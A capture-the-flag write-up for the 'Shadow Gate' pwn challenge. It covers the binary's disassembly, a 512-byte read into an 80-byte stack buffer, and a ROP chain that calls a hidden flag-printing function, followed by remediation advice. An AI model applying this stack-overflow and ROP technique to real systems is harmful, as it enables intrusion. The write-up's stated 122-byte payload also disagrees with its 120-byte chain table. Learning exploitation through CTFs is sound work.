# CTF Writeup: Null Origin CTF & Associated Challenges

This document provides complete, technical writeups for the CTF challenges solved across the sessions.

---

# 1. Shadow Gate (Null Origin CTF 2026)

| Field | Detail |
| :--- | :--- |
| **Category** | Pwn / Binary Exploitation |
| **Points** | 100 |
| **Difficulty** | Easy |
| **Author** | WHITE_SOULE |
| **Binary** | `shadow_gate` (ELF 64-bit x86-64) |
| **Flag** | `Null0rigin{sh4d0w_g4t3_br34ch3d_n1c3_0v3rfl0w}` |

---

## 1. Challenge Overview
The prompt provided a 64-bit ELF binary named `shadow_gate` simulating a classified security terminal:
> *"A classified security terminal has been discovered on an abandoned network. The system requires an authorization code - but the authentication logic seems flawed. Can you breach the Shadow Gate?"*

The service was hosted remotely with `nc 141.148.200.229 9001`.

---

## 2. Binary Mitigation & Static Analysis

Inspecting ELF header properties and security mitigations:
* **Architecture:** AMD x86-64, LSB executable, dynamically linked.
* **PIE (Position Independent Executable):** Disabled (loaded at standard static base `0x400000`).
* **Stack Canaries:** Disabled (no `__stack_chk_fail` or `fs:[0x28]` guards in the input function).
* **NX (No-Execute Stack):** Enabled (stack is non-executable, requiring ROP instead of shellcode).

---

## 3. Disassembly & Decompilation Walkthrough

### `main` (`0x401425`)
1. Calls setup function at `0x401246`, configuring `alarm(60)` (preventing idle hangs) and setting `stdout`/`stderr` buffering to unbuffered (`setvbuf`).
2. Outputs terminal banners:
   ```
   ========================================
      SHADOW GATE SECURITY TERMINAL   
        Classification: RESTRICTED    
   [*] Initializing secure channel...
   [*] WARNING: All attempts are logged.
   ========================================
   ```
3. Calls the input processing function (`vuln`) at `0x4013d1`.
4. Prints `[*] Connection terminated.` and returns.

---

### Vulnerable Input Function (`0x4013d1`)
```x86asm
0x4013d1: push   rbp
0x4013d2: mov    rbp, rsp
0x4013d5: sub    rsp, 0x50           ; Allocate 0x50 (80) bytes for stack frame
0x4013d9: lea    rax, [rip + 0xce4]  ; "[>] Enter authorization code: "
0x4013e0: mov    rdi, rax
0x4013e3: xor    eax, eax
0x4013e5: call   printf
0x4013ea: lea    rax, [rbp - 0x50]   ; Target buffer
0x4013ee: mov    edx, 0x200          ; Length: 0x200 = 512 bytes!
0x4013f3: mov    rsi, rax            ; Buffer destination
0x4013f6: mov    edi, 0              ; stdin (fd 0)
0x4013fb: call   read                ; Vulnerable read()
0x401400: lea    rax, [rbp - 0x50]
0x401404: mov    rsi, rax
0x401407: lea    rax, [rip + 0xcd2]  ; "[!] Code rejected: %.20s...\n"
0x40140e: mov    rdi, rax
0x401411: xor    eax, eax
0x401413: call   printf
0x401418: leave
0x401419: ret
```

**Vulnerability:**  
The local buffer is allocated at `[rbp - 0x50]` (80 bytes). However, `read(0, buf, 0x200)` reads up to **512 bytes** into this 80-byte buffer. This produces an unbounded stack buffer overflow allowing complete control over the saved frame pointer (`saved RBP`) and the saved instruction pointer (`saved RIP`).

---

### Target Function: `check_auth` (`0x4012c9`)
```x86asm
0x4012c9: push   rbp
0x4012ca: mov    rbp, rsp
0x4012cd: sub    rsp, 0xa0
0x4012d4: mov    qword ptr [rbp - 0x98], rdi   ; First argument
0x4012db: mov    eax, 0xc0ffee42
0x4012e0: cmp    qword ptr [rbp - 0x98], rax   ; Check if arg == 0xc0ffee42
0x4012e7: je     0x401301                      ; Branch if authenticated
0x4012e9: lea    rax, [rip + 0xd14]            ; "[!] Invalid security token."
0x4012f0: mov    rdi, rax
0x4012f3: call   puts
0x4012f8: jmp    0x401399
0x401301: lea    rsi, [rip + 0xd1c]            ; "r"
0x401308: lea    rdi, [rip + 0xd14]            ; "/flag.txt"
0x40130f: call   fopen
...
0x401362: lea    rdi, [rip + 0xced]            ; "[*] ACCESS GRANTED"
0x401369: call   puts
0x401371: lea    rsi, [rbp - 0x90]             ; Flag buffer
0x401378: lea    rdi, [rip + 0xce8]            ; "[*] FLAG: %s\n"
0x40137f: xor    eax, eax
0x401381: call   printf
0x401386: mov    edi, 0
0x40138b: call   exit
```

If `check_auth` is called with the first argument `rdi = 0xc0ffee42`, it opens `/flag.txt`, outputs `[*] ACCESS GRANTED` followed by the flag string, and exits cleanly.

---

### Helper Gadget
Examining the binary for gadgets to load `rdi`:
```x86asm
0x4013c4: endbr64
0x4013c8: push   rbp
0x4013c9: mov    rbp, rsp
0x4013cc: pop    rdi
0x4013cd: ret
```
* Gadget: `pop rdi; ret` located at static virtual address **`0x004013cc`**.
* Stack alignment gadget: `ret` located at **`0x00401194`** (ensures 16-byte stack alignment per x86-64 System V ABI before library calls like `fopen`).

---

## 4. Exploitation & Stack Construction

### Stack Frame Layout
To reach the saved return address from the input buffer:
$$\text{Offset} = \text{sizeof(buffer)} + \text{sizeof(saved RBP)} = 80 + 8 = 88\text{ bytes}$$

### ROP Chain Structure
| Offset | Value | Purpose |
| :--- | :--- | :--- |
| `0x00` - `0x4F` | `'A' * 80` | Fill local buffer |
| `0x50` - `0x57` | `'B' * 8` | Overwrite saved RBP |
| `0x58` - `0x5F` | `0x004013cc` | `pop rdi; ret` gadget |
| `0x60` - `0x67` | `0x00000000c0ffee42` | Magic authentication key for `rdi` |
| `0x68` - `0x6F` | `0x00401194` | `ret` (16-byte stack alignment) |
| `0x70` - `0x77` | `0x004012c9` | Address of `check_auth` |

### Attack Execution
Sending the constructed 122-byte payload to the target service:
```
[>] Enter authorization code: [!] Code rejected: AAAAAAAAAAAAAAAAAAAA...
[*] ACCESS GRANTED
[*] FLAG: Null0rigin{sh4d0w_g4t3_br34ch3d_n1c3_0v3rfl0w}
```

---

## 5. Defensive Remediation
To eliminate this vulnerability in production code:
1. **Bounded Input:** Restrict `read()` to `sizeof(buf) - 1`:
   ```c
   char buf[80];
   ssize_t n = read(0, buf, sizeof(buf) - 1);
   if (n > 0) buf[n] = '\0';
   ```
2. **Compiler Mitigations:** Compile with Stack Protectors and PIE enabled:
   ```bash
   gcc -fstack-protector-all -fPIE -pie -Wl,-z,relro,-z,now -o shadow_gate shadow_gate.c
   ```

---



